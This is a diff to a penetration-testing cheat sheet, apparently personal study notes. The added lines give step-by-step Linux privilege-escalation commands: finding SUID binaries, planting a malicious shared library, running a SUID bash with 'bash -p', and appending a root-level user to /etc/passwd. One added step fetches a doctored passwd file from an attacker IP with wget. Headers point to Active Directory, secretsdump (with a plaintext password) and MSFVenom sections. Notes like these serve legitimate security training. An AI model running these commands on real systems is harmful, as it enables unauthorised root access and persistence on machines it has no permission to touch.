@@ -717,8 +717,12 @@ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 ```
 
-### create malicious .so file and place it in the location the program expects it to be
-- identify any SUID binaries with missing .so files using a tool called strace.
+### create malicious .so file and place it in the location the program expects it to be (https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/)
+- First, find .so with SUID using 'find / -type f -perm -04000 -ls 2>/dev/null'
+- Next, attempt to execute the .so file e.g. $/usr/local/bin/suid-so, to see what happens
+- To see what is running at the back scene after executing the .so, we use strace 'strace /usr/local/bin/suid-so 2>&1'
+- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using 'strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"'
+- once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
 - https://rootrecipe.medium.com/suid-binaries-27c724ef753c
 ```c
 #include <stdio.h>
@@ -759,7 +763,8 @@ su root
 ```
 
 2. SUID Binaries (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
-- If you execute ls -al with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.
+- detection 1: 'find / -perm -u=s -type f 2>/dev/null'
+- detection 2: you execute ls -al with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.
 
 3. Sudo Rights
 - check root permissions for any user to execute any file or command by executing sudo -l command.
@@ -901,6 +906,8 @@ chmod +x /home/user/overwrite.sh
 id
 whoami
 ```
+
+
 
 # Active Directory Pentesting
 ## Enumeration
@@ -1358,9 +1365,13 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 # MISC
 
 ## General tips
--  /tmp directory has all permission to create or delete any file, use it
--  If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
+- /dev/null is the standard Linux device where you send output that you want ignored.
+- /tmp directory has all permission to create or delete any file, use it
+- If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
 - If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'
+- if '/bin/bash' doesnt work, try '/bin/sh'
+- to run binary program, can specify '/home' instead of current directory '.'
+- to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignote:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
 
 ## MSFVenom
 
